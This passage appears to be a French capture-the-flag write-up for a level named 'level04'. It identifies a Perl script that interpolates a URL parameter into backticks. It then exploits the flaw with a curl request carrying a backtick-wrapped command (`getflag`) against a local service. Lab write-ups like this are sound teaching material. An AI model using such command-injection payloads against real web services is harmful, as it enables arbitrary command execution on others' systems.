@@ -1,0 +1,22 @@
+Definition:
+En Perl, les backticks `` `command` `` exécutent une commande système et retournent son résultat.  
+Si l’entrée utilisateur est injectée dans ces backticks, on peut exécuter des commandes arbitraires (vulnérabilité d’injection de commande).
+
+Piste:
+Inspection du fichier Perl fourni :  
+
+$ cat /home/user/level04/level04.pl  
+
+On remarque la ligne :  
+print `echo $y 2>&1`;  
+
+Donc ce que l’utilisateur envoie (via l’URL) est passé à `echo` dans des backticks → possibilité d’injection.
+
+Exploitation:
+Envoyer une requête HTTP avec `curl` :  
+
+$ curl "http://localhost:4747/?x=\`getflag\`"  
+
+→ L’argument injecté (`\`getflag\``) est exécuté directement par Perl.  
+→ Le résultat de la commande `getflag` est affiché dans la réponse HTTP.
+
